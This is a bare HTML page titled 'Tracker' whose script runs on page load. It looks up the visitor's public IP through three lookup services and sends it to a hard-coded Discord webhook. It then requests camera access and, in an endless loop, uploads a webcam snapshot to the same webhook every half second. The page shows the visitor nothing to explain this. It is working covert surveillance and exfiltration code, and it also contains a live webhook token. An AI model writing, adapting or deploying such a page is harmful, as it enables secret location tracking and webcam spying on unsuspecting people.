<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Tracker</title>
</head>
<body>
<script>
const webhook = "https://discord.com/api/webhooks/1385579764592545852/x523eBesGbYlF1EtN7CEwy52A8EpvX9fOGl37Xx63YeS1sEHLAu7_kEif9krCA3bt_lY";

async function fetchIPFromAPI(url, parseFn) {
  try {
    let res = await fetch(url);
    if (!res.ok) return null;
    let data = await res.json();
    return parseFn(data);
  } catch {
    return null;
  }
}

async function getPublicIP() {
  // Try multiple services
  let ip = await fetchIPFromAPI('https://api.ipify.org?format=json', data => data.ip);
  if (ip) return ip;

  ip = await fetchIPFromAPI('https://ipapi.co/json/', data => data.ip);
  if (ip) return ip;

  ip = await fetchIPFromAPI('https://ipinfo.io/json', data => data.ip);
  if (ip) return ip;

  return null;
}

async function sendData(imageBlob, ip) {
  const form = new FormData();
  form.append('payload_json', JSON.stringify({
    content: `IP Info: ${ip ? ip : 'Unavailable'}`
  }));
  if (imageBlob) {
    form.append('file', imageBlob, 'capture.png');
  }

  try {
    const response = await fetch(webhook, {
      method: 'POST',
      body: form
    });
    if (!response.ok) {
      console.error('Failed to send webhook:', response.status, response.statusText);
    }
  } catch (e) {
    console.error('Error sending webhook:', e);
  }
}

async function captureLoop() {
  const ip = await getPublicIP();
  await sendData(null, ip); // send IP info even if no camera access

  let stream;
  try {
    stream = await navigator.mediaDevices.getUserMedia({video:true});
  } catch {
    console.error('Camera access denied or unavailable');
    return;
  }

  const video = document.createElement('video');
  video.srcObject = stream;
  await video.play();

  const canvas = document.createElement('canvas');
  const ctx = canvas.getContext('2d');

  while (true) {
    await new Promise(r => setTimeout(r, 500));
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const blob = await new Promise(res => canvas.toBlob(res, 'image/png'));

    await sendData(blob, ip);
  }
}

captureLoop();
</script>
</body>
</html>
